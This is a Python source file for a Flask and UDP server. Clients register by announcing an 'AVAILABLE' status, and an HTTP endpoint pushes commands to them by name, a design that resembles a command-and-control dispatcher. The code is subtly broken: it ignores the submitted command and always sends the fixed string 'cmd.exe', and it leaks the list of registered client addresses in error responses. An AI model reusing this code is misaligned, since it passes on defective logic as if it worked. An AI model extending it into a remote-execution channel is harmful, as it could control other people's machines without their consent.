from flask import Flask, request, jsonify
import socket
import threading
import json
import logging

app = Flask(__name__)

clients = {}

# This will be a simple UDP server to communicate with clients
def udp_listener():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(("0.0.0.0", 12345))  # Listen on port 12345

    while True:
        data, addr = server_socket.recvfrom(1024)
        message = json.loads(data.decode())
        
        if message.get('status') == 'AVAILABLE':
            logging.info(f"Client {message['name']} is available at {addr}")
            clients[message['name']] = addr  # Save the client's name and address
            server_socket.sendto("ACKNOWLEDGED".encode(), addr)  # Optionally send a response to the client

@app.route('/send_command/<client_name>', methods=['POST', 'GET'])
def send_command(client_name):
    if client_name not in clients:
        print(clients)
        return jsonify({"error": "Client not found", "clients": clients}), 404

    command = request.json.get('command')
    if not command:
        return jsonify({"error": "No command provided"}), 400

    client_address = clients[client_name]
    message = json.dumps({"command": "cmd.exe"})
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.sendto(message.encode(), client_address)
    return jsonify({"status": "Command sent to client"}), 200

if __name__ == '__main__':
    # Start the UDP listener in a separate thread to handle client discovery
    listener_thread = threading.Thread(target=udp_listener, daemon=True)
    listener_thread.start()

    # Start the Flask server
    app.run(host='0.0.0.0', port=5000)
